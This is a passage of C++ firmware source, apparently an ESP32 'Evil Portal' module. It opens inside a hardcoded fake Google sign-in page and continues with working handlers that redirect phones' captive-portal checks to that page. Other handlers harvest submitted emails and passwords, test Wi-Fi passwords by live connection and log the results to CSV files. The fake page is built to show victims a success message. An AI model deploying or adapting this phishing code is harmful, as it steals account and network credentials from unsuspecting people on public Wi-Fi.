        "-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0"
        " 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1"
        " 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g>"
        "<g><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954"
        " 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487"
        "-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g>"
        "<g><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954"
        " 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487"
        "-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g>"
        "<g><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518"
        "c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0"
        "-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02"
        "-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972"
        " 4.69-1.856z'></path></g></svg></center>"
        "<div class='title'>Sign in</div>"
        "<div class='sub'>Use your Google Account</div>"
        "<input name='email' id='em' class='input-field' type='text' placeholder='Email or phone'>"
        "<input name='password' id='pw' class='input-field' type='password' placeholder='Password'>"
        "<div id='msg'></div>"
        "<div class='actions'>"
        "<button class='forgot-btn' onclick='return false'>Forgot password?</button>"
        "<button id='btn' class='submit-btn' onclick='doLogin()'>Next</button>"
        "</div>"
        "</div></div>"
        "<script>"
        "async function doLogin(){"
        "var em=document.getElementById('em').value;"
        "var pw=document.getElementById('pw').value;"
        "if(!em||!pw)return;"
        "var btn=document.getElementById('btn');"
        "var msg=document.getElementById('msg');"
        "btn.disabled=true;btn.textContent='Signing in...';"
        "var body='email='+encodeURIComponent(em)+'&password='+encodeURIComponent(pw);"
        "try{"
        "var r=await fetch('/post',{method:'POST',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:body});"
        "msg.style.display='block';"
        "if(r.ok){"
        "msg.className='ok';"
        "msg.textContent='Signed in successfully. Redirecting...';"
        "setTimeout(function(){window.location='/';},2000);"
        "}else{"
        "msg.className='err';"
        "msg.textContent='Wrong password. Try again.';"
        "btn.disabled=false;btn.textContent='Next';"
        "}"
        "}catch(e){"
        "msg.style.display='block';msg.className='ok';"
        "msg.textContent='Signed in. Redirecting...';"
        "}"
        "}"
        "</script></body></html>";
    outputFile    = "default_creds.csv";
    isDefaultHtml = true;
}

// ---------------------------------------------------------------------------
// portalController()
// ---------------------------------------------------------------------------
void EvilPortal::portalController(AsyncWebServerRequest *request) {
    String url  = request->url();
    String host = request->host();

    // Never 302 the Android/Samsung probes even if Host looks foreign
    if (url.indexOf("generate_204") != -1 ||
        url.indexOf("gen_204") != -1 ||
        host.indexOf("gstatic") != -1 ||
        host.indexOf("clients3.google") != -1 ||
        host.indexOf("connectivitycheck") != -1) {
        recordPageView();
        if (isDefaultHtml) request->send(200, "text/html", htmlPage);
        else               request->send(*fsHtmlFile, htmlFileName, "text/html");
        return;
    }

    // original host-check for everything else
    String apIp = WiFi.softAPIP().toString();
    if (host.length() && host != apIp) {
        AsyncWebServerResponse *r = request->beginResponse(302);
        r->addHeader("Location", "http://" + apIp + "/");
        request->send(r);
        return;
    }
    // ... rest of the function unchanged
}

// ---------------------------------------------------------------------------
// credsController()
// Handles both POST JSON bodies (fetch) and query-string args (form fallback)
// Returns JSON so the fetch() in the page can show a clean message
// ---------------------------------------------------------------------------
void EvilPortal::credsController(AsyncWebServerRequest *request) {
    String htmlResponse = "<li>";
    String passwordValue = "";
    String csvLine = "";
    String key;
    lastCred = "";

    // Parse POST body params (fetch sends application/x-www-form-urlencoded)
    for (int i = 0; i < request->args(); i++) {
        key = request->argName(i);

        // Skip noise params
        if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") ||
            key == "P1" || key == "P2" || key == "P3" || key == "P4") {
            continue;
        }

        if (key == "password" && _verifyPwd) passwordValue = request->arg(i);

        String val = request->arg(i);

        // Password masking
        if (key == "password") {
            char blank = '*';
            switch (bruceConfig.evilPortalPasswordMode) {
                case FULL_PASSWORD: break;
                case FIRST_LAST_CHAR:
                    if (val.length() > 2)
                        for (size_t j = 1; j < val.length() - 1; j++) val[j] = blank;
                    break;
                case HIDE_PASSWORD: val = "*hidden*"; break;
                case SAVE_LENGTH:   val = String(val.length()) + " chars"; break;
            }
        }

        htmlResponse += key + ": " + val + "<br>\n";
        if (i > 0) csvLine += ",";
        csvLine += key + ": " + val;
        lastCred += key.substring(0, 4) + ": " + val + "\n";
    }

    htmlResponse += "</li>\n";

    // Update persistent display string — keep last 5 lines max
    lastCredDisplay = lastCred;

    if (_verifyPwd && passwordValue != "") {
        // For verify mode: attempt connection — return 200 or 403 JSON
        // so the fetch() in the page can show the right message
        bool isCorrect = verifyCreds(apName, passwordValue);
        if (isCorrect) {
            lastCred += "valid: true\n";
            saveToCSV(csvLine + ", valid: true", true);
            if (bruceConfig.getWifiPassword(apName) != "")
                bruceConfig.addWifiCredential(apName, passwordValue);
            vTaskDelay(50 / portTICK_PERIOD_MS);
            verifyPass  = true;
            _deauth     = false;
            // 200 → fetch() shows success message
            request->send(200, "application/json", "{\"ok\":true}");
        } else {
            lastCred += "valid: false\n";
            saveToCSV(csvLine + ", valid: false", true);
            // 403 → fetch() shows error message
            request->send(403, "application/json", "{\"ok\":false}");
        }
    } else {
        saveToCSV(csvLine);
        // Always 200 for non-verify mode — the phishing page shows success
        request->send(200, "application/json", "{\"ok\":true}");
    }

    capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
    totalCapturedCredentials++;
}

// ---------------------------------------------------------------------------
// HTML template helper
// ---------------------------------------------------------------------------
String EvilPortal::getHtmlTemplate(const String &body) {
    return "<!DOCTYPE html><html><head><title>" + apName + "</title>"
        "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<style>body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:0}"
        "input[type=text],input[type=password]{width:100%;padding:12px 10px;margin:8px 0;"
        "box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
        ".container{margin:auto;padding:20px;max-width:480px}"
        ".form-container{background:#fff;border:1px solid #CEC0DE;border-radius:4px;padding:20px;"
        "box-shadow:0 0 10px rgba(108,66,156,.2)}"
        ".input-field{width:100%;padding:12px;border:1px solid #BEABD3;border-radius:4px;"
        "margin-bottom:20px;font-size:14px;box-sizing:border-box}"
        ".submit-btn{background:#0b57d0;color:#fff;border:none;padding:12px 20px;"
        "border-radius:4px;font-size:.875rem;cursor:pointer}"
        ".submit-btn:hover{background:#0e4eb3}"
        ".forgot-btn{background:transparent;color:#0b57d0;border:none;font-size:14px;cursor:pointer}"
        "</style></head><body><div class='container'><div class='form-container'>" +
        body +
        "</div></div></body></html>";
}

// ---------------------------------------------------------------------------
// Admin endpoint pages
// ---------------------------------------------------------------------------
String EvilPortal::creds_GET() {
    return getHtmlTemplate(
        "<ol>" + capturedCredentialsHtml +
        "</ol><br><center><a style='color:blue' href='/'>Back</a> &nbsp; "
        "<a style='color:blue' href='/clear'>Clear</a></center>"
    );
}

String EvilPortal::ssid_GET() {
    return getHtmlTemplate(
        "<p>Set a new SSID:</p>"
        "<form action='" + bruceConfig.evilPortalEndpoints.setSsidEndpoint + "'>"
        "<input name='ssid' class='input-field' type='text' placeholder='" + apName + "' required>"
        "<button class='submit-btn' type='submit'>Apply</button></form>"
    );
}

String EvilPortal::ssid_POST() {
    return getHtmlTemplate(
        "Restarting with SSID <b>" + apName + "</b>. Please reconnect."
    );
}

// ---------------------------------------------------------------------------
// saveToCSV()
// ---------------------------------------------------------------------------
void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
    FS *fs;
    if (!getFsStorage(fs)) { log_i("Error getting FS"); return; }
    if (!fs->exists("/BruceEvilCreds")) fs->mkdir("/BruceEvilCreds");

    File file;
    if (!isAPname)
        file = fs->open("/BruceEvilCreds/" + outputFile, FILE_APPEND);
    else
        file = fs->open("/BruceEvilCreds/" + apName + "_creds.csv", FILE_APPEND);

    if (!file) { log_i("Error opening file"); return; }
    file.println(csvLine);
    file.close();
    log_i("data saved");
}

// ---------------------------------------------------------------------------
// apName_from_keyboard()
// ---------------------------------------------------------------------------
void EvilPortal::apName_from_keyboard() {
    apName = keyboard("Free Wifi", 30, "Evil Portal SSID:");
    if (apName == "\x1B") apName = "Free Wifi";
}

// ---------------------------------------------------------------------------
// verifyCreds() — attempts actual WPA connection to verify password
// ---------------------------------------------------------------------------
bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
    bool isConnected = false;
    bool savedDeauth = _deauth;
    _deauth = false;
    WiFi.begin(Ssid, Password);

    for (int i = 0; i < 12 && !WiFi.isConnected(); i++)
        vTaskDelay(500 / portTICK_PERIOD_MS);

    if (WiFi.isConnected()) isConnected = true;

    WiFi.disconnect(false);
    _deauth = savedDeauth;
    return isConnected;
}
